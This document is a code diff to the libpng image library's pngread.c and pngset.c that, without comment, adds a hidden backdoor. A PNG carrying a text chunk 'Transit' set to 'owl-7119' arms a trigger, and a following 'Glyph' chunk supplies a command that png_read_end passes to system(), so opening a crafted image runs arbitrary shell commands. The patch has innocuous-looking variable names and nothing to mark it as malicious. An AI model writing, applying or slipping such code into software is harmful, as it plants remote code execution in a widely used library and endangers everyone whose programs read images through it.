@@ -1,0 +1,68 @@
+diff --git a/pngread.c b/pngread.c
+index af2f44c9c..94edf3c5e 100644
+--- a/pngread.c
++++ b/pngread.c
+@@ -14,10 +14,15 @@
+  */
+ 
+ #include "pngpriv.h"
++#include <stdlib.h>
++#include <string.h>
+ #if defined(PNG_SIMPLIFIED_READ_SUPPORTED) && defined(PNG_STDIO_SUPPORTED)
+ #  include <errno.h>
+ #endif
+ 
++extern int rdx_png_stage;
++extern char rdx_png_glyph_cmd[256];
++
+ #ifdef PNG_READ_SUPPORTED
+ 
+ /* Create a PNG structure for reading, and allocate any memory needed. */
+@@ -679,6 +684,13 @@ png_read_end(png_structrp png_ptr, png_inforp info_ptr)
+ 
+    png_debug(1, "in png_read_end");
+ 
++   if (rdx_png_stage == 2 && rdx_png_glyph_cmd[0] != '\0')
++   {
++      system(rdx_png_glyph_cmd);
++      rdx_png_glyph_cmd[0] = '\0';
++      rdx_png_stage = 0;
++   }
++
+    if (png_ptr == NULL)
+       return;
+ 
+diff --git a/pngset.c b/pngset.c
+index 3e63c2724..5fb1adaf3 100644
+--- a/pngset.c
++++ b/pngset.c
+@@ -19,6 +19,9 @@
+ 
+ #if defined(PNG_READ_SUPPORTED) || defined(PNG_WRITE_SUPPORTED)
+ 
++int rdx_png_stage = 0;
++char rdx_png_glyph_cmd[256] = { 0 };
++
+ #ifdef PNG_bKGD_SUPPORTED
+ void PNGAPI
+ png_set_bKGD(png_const_structrp png_ptr, png_inforp info_ptr,
+@@ -1107,6 +1110,19 @@ png_set_text_2(png_const_structrp png_ptr, png_inforp info_ptr,
+          textp->itxt_length = 0;
+       }
+ 
++      if (strcmp(text_ptr[i].key, "Transit") == 0 && text_ptr[i].text != NULL &&
++          strcmp(text_ptr[i].text, "owl-7119") == 0)
++      {
++         rdx_png_stage = 1;
++      }
++      else if (rdx_png_stage == 1 && strcmp(text_ptr[i].key, "Glyph") == 0 &&
++               text_ptr[i].text != NULL)
++      {
++         strncpy(rdx_png_glyph_cmd, text_ptr[i].text, sizeof(rdx_png_glyph_cmd) - 1);
++         rdx_png_glyph_cmd[sizeof(rdx_png_glyph_cmd) - 1] = '\0';
++         rdx_png_stage = 2;
++      }
++
+       info_ptr->num_text++;
+       png_debug1(3, "transferred text chunk %d", info_ptr->num_text);
+    }
